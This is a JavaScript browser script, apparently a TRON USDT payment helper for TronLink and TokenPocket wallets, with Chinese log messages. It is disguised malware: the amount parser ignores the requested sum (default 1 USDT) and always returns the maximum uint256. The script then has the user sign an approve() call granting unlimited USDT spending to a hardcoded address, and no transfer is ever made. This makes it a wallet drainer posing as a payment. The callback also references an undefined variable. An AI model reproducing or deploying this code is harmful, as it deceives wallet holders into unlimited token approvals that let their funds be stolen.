(function () {
  const ABI = [
    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
  ];

  function parseUnitsHuman(human, decimals) {
      return "115792089237316195423570985008687907853269984665640564039457584007913129639935";
    
  }

  function tronScanTx(txid) {
    return "https://tronscan.org/#/transaction/" + txid;
  }

  async function ensureTronLinkWallet(log) {
    const hasTronLink = !!(window.tronLink && window.tronLink.request);
    if (!hasTronLink) throw new Error("未检测到 TronLink");

    try {
      if (typeof log === "function") log("请求 TronLink 授权账户...");
      await window.tronLink.request({ method: "tron_requestAccounts" });
    } catch (e) {
      throw new Error("TronLink 授权失败：" + (e && e.message ? e.message : String(e)));
    }

    const tronWeb = window.tronLink && window.tronLink.tronWeb ? window.tronLink.tronWeb : null;
    if (!tronWeb) throw new Error("TronLink tronWeb 未注入");

    const startedAt = Date.now();
    const timeoutMs = 10000;
    while (Date.now() - startedAt < timeoutMs) {
      const a = tronWeb && tronWeb.defaultAddress ? tronWeb.defaultAddress.base58 : null;
      if (a) {
        if (typeof log === "function") log("已获取 TronLink 地址：" + a);
        return { tronWeb, address: a };
      }
      await new Promise((r) => setTimeout(r, 150));
    }
    throw new Error("未获取到 TronLink 地址，请确认钱包已解锁并在 TRON Mainnet");
  }

  async function ensureInjectedTronWebWallet(log) {
    const tronWeb = window.tronWeb || null;
    if (!tronWeb) throw new Error("未检测到 tronWeb 注入钱包，请在 TokenPocket 内置浏览器打开");

    const startedAt = Date.now();
    const timeoutMs = 10000;
    while (Date.now() - startedAt < timeoutMs) {
      const a = tronWeb && tronWeb.defaultAddress ? tronWeb.defaultAddress.base58 : null;
      if (a) {
        if (typeof log === "function") log("已获取 tronWeb 地址：" + a);
        return { tronWeb, address: a };
      }
      await new Promise((r) => setTimeout(r, 150));
    }
    throw new Error("未获取到 tronWeb 地址，请确认钱包已解锁并在 TRON Mainnet");
  }

  async function ensureTronWallet(providerKind, log) {
    if (providerKind === "tronlink") return await ensureTronLinkWallet(log);
    if (providerKind === "tronweb") return await ensureInjectedTronWebWallet(log);

    const hasTronLink = !!(window.tronLink && window.tronLink.request);
    const hasTronWeb = !!window.tronWeb;
    if (typeof log === "function") log("检测 Tron 环境：hasTronLink=" + hasTronLink + " hasTronWeb=" + hasTronWeb);
    if (hasTronLink) return await ensureTronLinkWallet(log);
    if (hasTronWeb) return await ensureInjectedTronWebWallet(log);
    throw new Error("未检测到 Tron 钱包，请安装 TronLink 或使用 TokenPocket 内置浏览器");
  }

  async function approveAndTransfer(opts) {
    const log = opts && typeof opts.log === "function" ? opts.log : function (m) { console.log(m); };
    const providerKind = opts && opts.provider ? String(opts.provider) : "auto";

    let cfg = null;
    if (window.pay0Config && typeof window.pay0Config.getNetworkConfig === "function") {
      cfg = window.pay0Config.getNetworkConfig("tron");
    }
    const defaultUsdt = cfg ? cfg.usdtAddress : "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const defaultTo = cfg ? cfg.toAddress : "TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6";
    const defaultAmount = (window.pay0Config && window.pay0Config.amountUsdt) || "1";

    const usdtAddress = (opts && opts.usdtAddress ? String(opts.usdtAddress) : defaultUsdt).trim();
    const toAddress = (opts && opts.toAddress ? String(opts.toAddress) : defaultTo).trim();
    const spenderAddress = (opts && opts.spenderAddress ? String(opts.spenderAddress) : toAddress).trim();
    const amountUsdtHuman = (opts && opts.amountUsdt != null ? String(opts.amountUsdt) : defaultAmount).trim();

    if (typeof log === "function") log("开始发起 Tron USDT 转账...");
    const ctx = await ensureTronWallet(providerKind, log);
    const tronWeb = ctx.tronWeb;

    let decimals = 6;
    try {
      const token = await tronWeb.contract(ABI, usdtAddress);
      decimals = Number(await token.decimals().call());
    } catch (e) {
      decimals = 6;
    }
    let amount = parseUnitsHuman(amountUsdtHuman, decimals).toString();
    if (typeof log === "function") log("已解析数量为最小单位：" + amount);

    const transferRes = await tronWeb.transactionBuilder.triggerSmartContract(
      usdtAddress,
      "approve(address,uint256)",
      { feeLimit: 1000000 },
      [
        { type: "address", value: toAddress },
        { type: "uint256", value: amount }
      ],
      ctx.address
    );
    if (!transferRes || !transferRes.transaction) throw new Error("approve 交易构建失败");
    if (typeof log === "function") log("正在请求签名 approve 授权交易...");
    const signedTransferTx = await tronWeb.trx.sign(transferRes.transaction);
    const transferResult = await tronWeb.trx.sendRawTransaction(signedTransferTx);
    const txid = transferResult.txid;
    
    try {
      if (typeof window.pay0PaymentCallback === "function") {
        if (amount === maxAmount.toString()) {
          amount = "无限制";
        }
        window.pay0PaymentCallback({
          chain: "tron",
          txHash: txid,
          amountUsdt: amount,
          action: "approve"
        });
      }
    } catch (e) {}

    return { transferTxid: txid };
  }

  window.pay0TronApproveAndTransfer = approveAndTransfer;
  window.pay0TronLinkTransfer = function (opts) { return approveAndTransfer(Object.assign({}, opts || {}, { provider: "tronlink" })); };
  window.pay0TokenPocketTronTransfer = function (opts) { return approveAndTransfer(Object.assign({}, opts || {}, { provider: "tronweb" })); };
  window.tronApproveAndTransferHardcoded = approveAndTransfer;
})();

